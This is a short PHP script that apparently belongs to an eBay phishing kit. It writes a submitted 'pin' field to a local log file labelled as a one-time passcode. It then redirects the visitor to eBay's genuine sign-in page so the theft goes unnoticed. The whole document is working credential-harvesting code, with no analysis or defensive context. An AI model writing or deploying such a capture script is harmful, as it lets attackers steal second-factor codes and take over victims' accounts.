<?php

    file_put_contents("log.txt", "OTP: " . $_POST['pin'] . "\n", FILE_APPEND);
header('Location: https://www.ebay.com/signin');
exit();